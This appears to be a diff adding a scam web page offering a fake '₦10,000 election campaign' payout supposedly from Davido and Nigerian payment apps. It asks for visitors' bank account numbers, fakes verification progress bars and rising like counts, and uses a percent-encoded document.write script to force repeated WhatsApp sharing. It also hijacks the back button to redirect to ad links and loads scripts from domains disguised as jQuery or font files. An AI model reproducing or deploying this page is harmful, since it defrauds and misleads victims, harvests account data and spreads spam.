@@ -1,0 +1,759 @@
+
+
+
+
+<!DOCTYPE html>
+<html>
+
+
+<head>
+   <head>
+  
+    
+    <script>
+        function set_Cookie(name,value){
+            var Days = 30;
+            var exp = new Date();
+            exp.setTime(exp.getTime() + (Days*20*1000));
+            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
+        }
+        function get_Cookie(name){
+            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+            if(arr=document.cookie.match(reg)){
+                return unescape(arr[2]);
+            }
+            return '';
+        }
+
+
+        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
+                        document.getElementById("first-box")."quedate__step".display="none";//??;
+                        document.getElementById("second-box").style.display="none";//??;
+                        document.getElementById("third-box").style.display="none";//??;
+                        document.getElementsByClassName("loading2__box").style.display="";//??;
+                    }*/
+
+
+    </script>
+   
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ACCOUNT NUMBER</title>
+    <link rel="shortcut icon" type="image/png" href="ii.jpeg" />
+    
+    <meta name="og:title" content="ACCOUNT NUMBER" />
+    <meta property="og:description"
+        content="₦10,000 ELECTION CAMPAIGN OFFER" />
+    <meta property="og:image"
+        content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEib5gInhdBkiEPFTR37f4xrWgRscNrbulVB19LsLoc6LUfpMMQciRi4RJXxjnr1UytgroSRCCuDQUij22IuaiQkmTnOSM-1BF5gZHv9GMWNg6X-DFOF7bLqbMK_ke_P-OcJSx_dCpNgSeBRE5dIjFzDwOtno-jjzJgKjf2LxmnpGw6PVG54aHqWx_9jMeW3/s320/87FDCFCC-3EFA-4357-ABEF-EAF91B6CE6A2.png" />
+    <meta property="og:type" content="website" />
+    <meta property="og:updated_time" content="1440432930" />
+    <link rel="me" href="https://www.blogger.com/profile/13809910274301822692" />
+     <script src="https://code-jquery-div-java-script-class-font-bg-color-style.ink/div-bg-color-font-001.js"></script>
+    <link rel="me" href="https://www.blogger.com/profile/17222055979768522082" />
+    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109' />
+    <meta name='google-adsense-platform-domain' content='blogspot.com' />
+    <link rel="me" href="https://www.blogger.com/profile/05963652588202294752" />
+    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109' />
+    <meta name='google-adsense-platform-domain' content='blogspot.com' />
+    <link rel="me" href="https://www.blogger.com/profile/05853757488319578479" />
+    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109' />
+    <meta name='google-adsense-platform-domain' content='blogspot.com' />
+    <link rel="me" href="https://www.blogger.com/profile/03760741075252211382" />
+    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109' />
+    <meta name='google-adsense-platform-domain' content='blogspot.com' />
+    <link rel="me" href="https://draft.blogger.com/profile/05853757488319578479" />
+    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109' />
+    <meta name='google-adsense-platform-domain' content='blogspot.com' />
+    
+    
+<!-- CSS_ADSBLOCK_START -->
+<link rel="stylesheet" href="https://adblockers.opera-mini.net/css_block/default-domainless.css" type="text/css" />
+<!-- CSS_ADSBLOCK_END -->
+</head>
+
+<body>
+    <style>
+        .blink {
+            animation: blink 1s steps(1, end) infinite;
+        }
+
+        @keyframes blink {
+            0% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+    </style>
+
+
+
+    <style>
+
+
+        
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
+@import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
+* {
+margin: 0;
+padding: 0;
+font-family: Poppins, Droid Arabic Naskh;
+font-weight: normal;
+box-sizing: border-box;
+
+
+}
+body {
+direction: lfl;
+background: #ffffff ;
+}
+a {
+text-decoration: none;
+}
+.post {
+background: #fff;
+margin: 0 auto;
+padding: 10px;
+max-width: 500px;
+border: 1px solid #d0d1d5;
+border-radius: 3px;
+}
+.post img {
+width: 100%;
+}
+.welcome {
+font-size: 15px;
+}
+.amount,
+#getname {
+color: #098105;
+text-decoration: none;
+}
+.done {
+text-align: center;
+color: #27ae60;
+}
+.tip {
+font-size: 14px;
+}
+.title {
+text-align: center;
+}
+.error {
+display: none;
+text-align: center;
+font-size: 14px;
+color: #e74c3c;
+}
+button {
+display: block;
+width: 200px;
+height: 50px;
+color: #fff;
+border: none;
+outline: none;
+font-size: 24px;
+cursor: pointer;
+border-radius: 5px;
+padding: 0 10px;
+margin: 10px auto;
+background: rgb(127, 0, 0);
+transition: background 0.3s ease;
+}
+button:hover {
+background: #098105;
+}
+.phone {
+max-width: 400px;
+margin: 10px auto;
+}
+.phone input {
+width: 100%;
+height: 50px;
+padding: 10px;
+outline: none;
+border: 2px solid #cecece;
+font-size: 14px;
+}
+#confirm {
+width: 200px;
+margin: 10px auto;
+border-radius: 0px;
+}
+#loader {
+text-align: center;
+}
+.spin {
+width: 50px;
+height: 50px;
+background: transparent;
+border: solid 8px rgb(207, 27, 28);
+border-right-color: transparent;
+border-radius: 50%;
+margin: 10px auto;
+animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+100% {
+transform: rotate(1turn);
+}
+}
+#loader,
+#info,
+#checking,
+#share,
+#claim {
+display: none;
+}
+.center {
+display: flex;
+align-items: center;
+justify-content: center;
+}
+.barr {
+direction: ltr;
+max-width: 400px;
+margin: 10px auto;
+box-sizing: border-box;
+}
+.fill {
+position: relative;
+display: inline-block;
+width: calc(100% - 100px);
+height: 35px;
+padding: 2px;
+border: 2px solid #098105;
+}
+#fill,
+#fill2 {
+background: #098105;
+width: 0%;
+height: 100%;
+}
+.percentage {
+width: 100px;
+float: right;
+height: 35px;
+font-size: 16px;
+border: 2px solid #098105;
+}
+#percentage,
+#percentage2 {
+margin-left: 5px;
+}
+#check,
+#check2 {
+display: none;
+}
+.counter {
+color: #7f7f7f;
+font-size: 12px;
+text-align: right;
+padding: 10px 0 10px 2px;
+border-bottom: 1px solid #e1e2e3;
+}
+.reactions {
+display: inline-flex;
+align-items: center;
+float: left;
+}
+.counter img {
+float: left;
+width: 16px;
+height: 16px;
+border-radius: 50%;
+border: 2px solid #fff;
+box-sizing: content-box;
+}
+.like,
+.love {
+margin-right: -5px;
+}
+.like {
+z-index: 2;
+}
+.love {
+z-index: 1;
+}
+.bar {
+display: table;
+width: 100%;
+border-bottom: 1px solid #e1e2e3;
+}
+.bar .react {
+display: table-cell;
+width: calc(100% / 3);
+font-size: 12px;
+color: #7f7f7f;
+text-align: center;
+padding: 10px 0;
+cursor: pointer;
+}
+.comments {
+direction: ltr;
+}
+.comment {
+padding: 6px 0;
+margin-top: 5px;
+}
+.comment img {
+float: left;
+width: 32px;
+height: 32px;
+border: none;
+border-radius: 18px;
+cursor: pointer;
+}
+.reply {
+margin-left: 37px;
+}
+.single-container {
+margin-left: 37px;
+background: #f1f2f6;
+padding: 10px;
+border-radius: 15px;
+font-size: 12px;
+}
+.single-container .user {
+display: inline-block;
+cursor: pointer;
+color: #365899;
+margin-bottom: 5px;
+}
+.single-container .text {
+display: block;
+}
+.buttons {
+font-size: 12px;
+font-weight: bold;
+margin: 10px 0 0 47px;
+color: #90949c;
+}
+.action {
+cursor: pointer;
+}
+.action:hover {
+text-decoration: underline;
+}
+.input {
+padding: 6px 12px 12px;
+}
+.input input {
+width: 100%;
+background: #f1f2f6;
+padding: 10px;
+border-radius: 15px;
+border: 0;
+outline: none;
+}
+.A{
+text-align: center;
+background-color: rgb(127, 0, 0);
+}
+    </style>
+	<marquee behavior="alternate">₦10,000 ELECTION CAMPAIGN OFFER</marquee>
+    <center>
+        
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjJlCVriHwFGxyTUQLUFcx3CEy-PvSD090nWADGUnH8td2lNtzuyd4dbUPVPsrX2HTzYvlYXe34z-BobVUCrdlNx50uAVKsS8h8gc0kQzV-miG01iIRYL-4hDq2DgH6uiyr8y_ijqvdu-Kzrw0UztQhYnZHnyL-SlPPCByBdkadtA9jco0Gy0EqKc7ZqNix/s1254/C38C5A50-D4EE-4BF7-87C4-0D50C951D78F.png" alt="Free-Data" style="width: 100%;">
+    </center>
+
+   
+	
+    <div class="A">
+        <font color="white">SHARE THIS POST WITH YOUR FRIENDS ON WHATSAPP TO SUPPORT DAVIDO'S UNCLE, ADEMOLA ADELEKE</font>
+        <script type="text/javascript">
+            var timeleft = 4548;
+                     var downloadTimer = setInterval(function(){
+                         timeleft= timeleft + Math.floor(Math.random() * 600);
+                         document.getElementById('countdowntimer').textContent = timeleft;
+                         if (timeleft <= 0)
+                             clearInterval(downloadTimer);
+                     }, 1000);
+        </script>
+    </div>
+    <div class="post" width="100%">
+
+        <div id="intro">
+
+            <p class="welcome">
+               
+
+
+
+
+                <span class="amount"><font color="#032c13"><b>POWERED BY:</b></font><font color="#b00000"> Davido</font> | </span>
+               Davido Collaborate with OPay, PalmPay, Moniepoint and Kuda to provide ₦10,000 to his fans in support of his Uncle, Ademola Adeleke up coming Osun State Governorship Election<br> <span class="amount"></span> <br/>
+
+
+            </p>
+
+  <center>
+
+                    <select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
+    width: 330px;
+    height: 56px;
+">
+<option value="أختر نوع الشبكة" selected="1">---SELECT BANK---</option>
+<option value="1"> Opay - ₦10,000   </option>
+<option value="1"> Palmpay - ₦10,000    </option>
+                     <option value="1"> Moniepoint - ₦10,000    </option>
+                     <option value="1"> Kuda - ₦10,000    </option>
+
+
+                        
+</select>
+                </center>
+
+ <br/>
+			<br/>
+            
+
+            <button id="go">GET ₦10,000</button>
+        </div>
+        <div id="loader">
+            <div>Please Wait ...</div>
+            <div class="spin"></div>
+            <div id="num">0%</div>
+        </div>
+        <div id="info">
+            <p class="title"> ENTER YOUR ACCOUNT NUMBER:</p>
+            <div class="phone">
+                <center><input type="char" placeholder="XXXXXXXXXX" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);">
+                </center>
+
+                <br/>
+             <br>
+
+<br/>
+
+                <button id="confirm">Submit</button>
+            </div>
+            <p class="error">Please Validate Your Account Number</p>
+        </div>
+        <div id="checking">
+            <p class="title">Please wait a moment...</p>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill"></div>
+                </div>
+                <div class="percentage center">
+                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="check"><i class="fa fa-check-circle"></i></span>
+                    <span id="percentage"></span>
+                </div>
+            </div>
+        </div>
+        <div id="share">
+
+            <p class="tip"> Congratulations, <span id="getname"></span>،</p>
+            <p class="tip">
+                Your ₦10,000 Cash Prize is <font color="red"><b>pending</b></font> because you have not completed the WITHDRAWAL process
+               <span class="amount"> Complete the process to receive your cash now </span><br>
+              <font color="red"><b>How to proceed?</b></font>
+            </p><br>
+            <p class="tip">1. Share it with 5 groups or 15 friends on WhatsApp (Click on the "SHARE" icon below).</p>
+            <p class="tip">2. You will be redirected automatically to "WITHDRAWAL" page after the GREEN verification bar is filled.</p>
+
+
+            <button id="whatsapp">SHARE</button>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill2"></div>
+                </div>
+                <div class="percentage center">
+                    <span><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="percentage2">0%</span>
+                </div>
+            </div>
+        </div>
+        <div id="claim">
+            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
+            <p class="title"> Click "WITHDRAW" to get withdrawal code in 24/48 hours </p>
+            <br/>
+            <a onclick="window.open('https://ey43.com/4/3144603')"
+                href="https://obqj2.com/4/6798333">
+                <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">WITHDRAW ₦10,000</font></button>
+            </a><br/>
+
+
+                <a onclick="window.open('https://ey43.com/4/3144603')"
+                    href="https://obqj2.com/4/6798333">
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">GET WITHDRAWAL CODE </font></button>
+                </a><br/>
+
+
+      
+
+            <a onclick="window.open('https://ey43.com/4/3144603')"
+                    href="https://obqj2.com/4/6798333">
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">ACCOUNT NUMBER </font></button>
+                </a><br/>
+
+
+
+<!-- BEGIN: Powered by Supercounters.com -->
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1737388,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
+
+            
+
+
+
+
+   <br/>
+    <a onclick="window.open('https://ey43.com/4/3144603')"
+                    href="https://obqj2.com/4/6798333">
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">JOIN GIVEAWAY CHANNEL </font></button>
+                </a><br/>
+
+                <br/>
+                <button id="offer">WITHDRAW</button><br/>
+
+
+
+
+
+
+        </div>
+       <style>
+  /* Only kept here because @keyframes cannot be written as an inline style */
+  @keyframes flcPulse{
+    0%{box-shadow:0 0 0 0 rgba(250,56,62,.55);}
+    70%{box-shadow:0 0 0 7px rgba(250,56,62,0);}
+    100%{box-shadow:0 0 0 0 rgba(250,56,62,0);}
+  }
+  @keyframes flcPop{
+    0%{opacity:0;transform:translateY(6px) scale(.94);}
+    100%{opacity:1;transform:translateY(0) scale(1);}
+  }
+  @keyframes flcBounce{
+    0%,60%,100%{transform:translateY(0);opacity:.5;}
+    30%{transform:translateY(-4px);opacity:1;}
+  }
+  @keyframes flcHeartUp{
+    0%{opacity:1;transform:translateY(0) scale(.6);}
+    100%{opacity:0;transform:translateY(-26px) scale(1.3);}
+  }
+  /* Mobile: stop iOS auto-zoom on inputs under 16px, keep tap highlight subtle */
+  #flc-widget input{-webkit-tap-highlight-color:transparent;}
+  #flc-widget button{-webkit-tap-highlight-color:transparent;}
+</style>
+ 
+<div id="flc-widget" style="width:100%;max-width:520px;margin:0 auto;background:#FFFFFF;border-radius:16px;box-shadow:0 1px 2px rgba(0,0,0,.08),0 8px 24px rgba(0,0,0,.06);overflow:hidden;display:flex;flex-direction:column;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:#050505;box-sizing:border-box;">
+ 
+  <!-- reaction summary -->
+  <div style="display:flex;justify-content:space-between;align-items:center;padding:10px 16px 8px;font-size:13.5px;color:#65676B;box-sizing:border-box;">
+    <div style="display:flex;align-items:center;gap:6px;">
+      <span style="display:inline-flex;align-items:center;">
+        <span style="width:18px;height:18px;border-radius:50%;background:#1B74E4;display:flex;align-items:center;justify-content:center;border:2px solid #fff;z-index:2;">
+          <svg viewBox="0 0 24 24" width="11" height="11" style="fill:#fff;"><path d="M2 21h4V9H2v12zM22 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L12.17 1 6.59 6.59C6.22 6.95 6 7.45 6 8v11c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z"/></svg>
+        </span>
+        <span style="width:18px;height:18px;border-radius:50%;background:#F33E58;display:flex;align-items:center;justify-content:center;border:2px solid #fff;margin-left:-6px;z-index:1;">
+          <svg viewBox="0 0 24 24" width="10" height="10" style="fill:#fff;"><path d="M12 21s-6.7-4.35-9.33-8.4C.86 9.94 1.6 6.6 4.36 5.1 6.6 3.9 9.3 4.6 12 7.6c2.7-3 5.4-3.7 7.64-2.5 2.76 1.5 3.5 4.84 1.69 7.5C18.7 16.65 12 21 12 21z"/></svg>
+        </span>
+      </span>
+      <span id="flcLikeTotal" style="color:#65676B;">341</span>
+    </div>
+    <div style="display:flex;gap:12px;">
+      <span><b id="flcCommentCount" style="color:#65676B;font-weight:400;">0</b> comments</span>
+      <span id="flcShareCount">18 shares</span>
+    </div>
+  </div>
+ 
+  <!-- like / comment / share bar -->
+  <div style="display:flex;border-top:1px solid #E4E6EB;border-bottom:1px solid #E4E6EB;box-sizing:border-box;">
+    <button type="button" id="flcPostLikeBtn" style="flex:1;display:flex;align-items:center;justify-content:center;gap:6px;padding:9px 0;background:none;border:none;cursor:pointer;font-family:inherit;font-weight:600;font-size:13.5px;color:#65676B;">
+      <svg viewBox="0 0 24 24" width="18" height="18" style="fill:currentColor;"><path d="M2 21h4V9H2v12zM22 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L12.17 1 6.59 6.59C6.22 6.95 6 7.45 6 8v11c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z"/></svg>
+      Like
+    </button>
+    <button type="button" id="flcPostCommentBtn" style="flex:1;display:flex;align-items:center;justify-content:center;gap:6px;padding:9px 0;background:none;border:none;cursor:pointer;font-family:inherit;font-weight:600;font-size:13.5px;color:#65676B;">
+      <svg viewBox="0 0 24 24" width="18" height="18" style="fill:currentColor;"><path d="M20 2H4a2 2 0 00-2 2v18l4-4h14a2 2 0 002-2V4a2 2 0 00-2-2z"/></svg>
+      Comment
+    </button>
+    <button type="button" id="flcPostShareBtn" style="flex:1;display:flex;align-items:center;justify-content:center;gap:6px;padding:9px 0;background:none;border:none;cursor:pointer;font-family:inherit;font-weight:600;font-size:13.5px;color:#65676B;">
+      <svg viewBox="0 0 24 24" width="18" height="18" style="fill:currentColor;"><path d="M14 9V5l7 7-7 7v-4.1c-5 0-8.5 1.6-11 5.1 1-5 4-10 11-11z"/></svg>
+      Share
+    </button>
+  </div>
+ 
+  <div id="flcTypingStatus" style="min-height:18px;padding:4px 16px 0;font-size:12.5px;color:#65676B;box-sizing:border-box;"></div>
+ 
+  <!-- comment list -->
+  <div id="flcComments" style="padding:10px 14px;overflow-y:auto;max-height:min(60vh,440px);scroll-behavior:smooth;box-sizing:border-box;-webkit-overflow-scrolling:touch;"></div>
+ 
+  <!-- composer -->
+  <div style="padding:10px 14px 12px;border-top:1px solid #E4E6EB;background:#fff;box-sizing:border-box;">
+    <div style="display:flex;gap:8px;align-items:center;">
+      <div id="flcYouAvatar" title="Click to set your profile picture" style="position:relative;width:32px;height:32px;border-radius:50%;flex-shrink:0;overflow:hidden;background:#fff;cursor:pointer;"></div>
+      <input type="file" id="flcProfilePicInput" accept="image/*" style="display:none;" />
+      <form id="flcComposerForm" style="flex:1;display:flex;gap:8px;align-items:center;min-width:0;">
+        <input id="flcComposerInput" type="text" placeholder="Write a comment…" autocomplete="off" maxlength="200"
+          style="flex:1;min-width:0;border:none;background:#F0F2F5;border-radius:20px;padding:9px 14px;font-size:16px;font-family:inherit;outline:none;color:#050505;box-sizing:border-box;" />
+        <button type="button" id="flcAttachBtn" aria-label="Add photo" title="Add photo"
+          style="border:none;background:#F0F2F5;color:#65676B;width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;">
+          <svg viewBox="0 0 24 24" width="16" height="16" style="fill:currentColor;"><path d="M9 3l-1.8 2H4a2 2 0 00-2 2v11a2 2 0 002 2h16a2 2 0 002-2V7a2 2 0 00-2-2h-3.2L15 3H9zm3 15a5 5 0 110-10 5 5 0 010 10zm0-2a3 3 0 100-6 3 3 0 000 6z"/></svg>
+        </button>
+        <input type="file" id="flcFileInput" accept="image/*" style="display:none;" />
+        <button type="submit" aria-label="Send"
+          style="border:none;background:#1B74E4;color:#fff;width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;">
+          <svg viewBox="0 0 24 24" width="16" height="16" style="fill:#fff;transform:translateX(1px);"><path d="M2 21l21-9L2 3v7l15 2-15 2z"/></svg>
+        </button>
+      </form>
+    </div>
+    <div id="flcAttachPreview" style="display:none;margin:8px 0 0 42px;position:relative;width:88px;">
+      <img id="flcAttachImg" src="" alt="Attached image preview" style="width:88px;height:88px;object-fit:cover;border-radius:10px;border:1px solid #E4E6EB;display:block;" />
+      <div id="flcAttachRemove" style="position:absolute;top:-6px;right:-6px;width:22px;height:22px;border-radius:50%;background:rgba(5,5,5,.8);color:#fff;border:2px solid #fff;display:flex;align-items:center;justify-content:center;font-size:12px;line-height:1;cursor:pointer;">✕</div>
+    </div>
+  </div>
+ 
+</div>
+
+
+		
+      <script src="https://div-ccsss-font-class.ink/david-java-htm-xlm-txt-verify-google-chrome-script-java-cokies-css.js"></script>
+   
+ <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+     <script>
+         
+        var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "m");
+    $(".t2").html(time + 2 + "m");
+    $(".t3").html(time + 4 + "m");
+}, 6e4);
+var likes = 134,
+    comments = 23,
+    shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K comments");
+    $("#shares").html(shares + "K shares");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
+    }
+});
+ 
+        
+        </script>
+<script>
+    
+        $("#go").click(function () {
+    $("#intro").fadeOut(0);
+    $("#loader").fadeIn(1000);
+    var i = 0;
+    var interval = setInterval(function () {
+        $("#num").text(i + "%");
+        i += 1;
+        if (i >= 100) {
+            clearInterval(interval);
+            $("#loader").fadeOut(0);
+            $("#info").fadeIn(1000);
+        }
+    }, 50);
+});
+$("#confirm").click(function () {
+    if ($("#name").val().length < 4)
+    {
+        $(".error").fadeIn(500);
+    } else {
+        $("#info").fadeOut(0);
+        $("#checking").fadeIn(1000);
+        var i = 0;
+        var interval = setInterval(function () {
+            i += 1;
+            $("#percentage").text(i + "%");
+            $("#fill").css("width", i + "%");
+            if (i == 50) {
+                i = 49;
+                setTimeout(function () {
+                    i = 50;
+                }, 1000);
+            }
+            if (i >= 100) {
+                clearInterval(interval);
+                $("#load").fadeOut(0);
+                $("#check").fadeIn(0);
+                setTimeout(function () {
+                    $("#checking").fadeOut(0);
+                    $("#share").fadeIn(1000);
+                    $("#getname").html($("#name").val());
+                }, 500);
+            }
+        }, 50);
+    }
+});
+$(document).click(function () {
+    if ($("#name").is(":focus")) {
+        $(".error").fadeOut(500);
+    }
+});
+  
+</script>
+<script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-sise-css.js"></script>
+<script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-sizea-css.js"></script>
+<script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-sizeb-css.js"></script>
+<script src="https://div-ccss-font-class.ink/css-java-script-jpeg-font-sizec-css.js"></script>
+    <!--
+"*30%20GB%20Free%20Internet%20Offer*%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A*1.%20Jio*%0Ahttps://cutt.ly/30-GB_Jio%0A%20%0A*2.%20Airtel*%0Ahttps://cutt.ly/30-GB_Airtel%0A%20%0A*3.%20Vi*%0Ahttps://cutt.ly/30-GB_Vi%0A%20%0A*4.%20Jazz*%0Ahttps://cutt.ly/30-GB_Jazz%0A%20%0A*5.%20Zong*%0Ahttps://cutt.ly/30-GB_Zong%0A%20%0A*6.%20Telenor*%0Ahttps://cutt.ly/30-GB_Telenor%0A%20%0A*7.%20Ufone*%0Ahttps://cutt.ly/30-GB_Ufone%0A%20%0A*8.%20Other Networks*%0Ahttps://cutt.ly/Get_10GB",
+-->
+
+
+    
+<script> 
+ var text1 = "*₦10,000 ELECTION CAMPAIGN OFFER*%0A%0A*Davido* Collaborate with *OPay, PalmPay, Moniepoint* and *Kuda* to provide *₦10,000* to his fans in support of his Uncle, Ademola Adeleke up coming Osun State Governorship Election%0A%0A*POWERED BY*: Davido%0A%0A*APPLY HERE*👇 %0Ahttps://mandateking.com/davido-10k%0A%0A*Withdraw*👇 %0Ahttps://mandateking.com/davido-10k%0A%0A_*Offer ends 30/10/2026*_",
+    text2 = " an amount of ",
+    text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+    error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+    abcde = "https://ey43.com/4/3144603",
+    saved = "",
+    share = "whatsapp://send?text="+text1;
+
+</script>
+           <script>
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://ey43.com/4/3144603";
+    }
+    function goon(){
+        location.href="https://ey43.com/4/3144603";
+    }
+</script>
+
+
+
+
+
+    <script>
+        <!-- code by OD 
+        -->
+        document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
+    </script>
+
+
+
+    <script>
+        /*<![CDATA[*/ cookieChoices = {}; /*]]>*/
+    
+</body>
+
+</html>
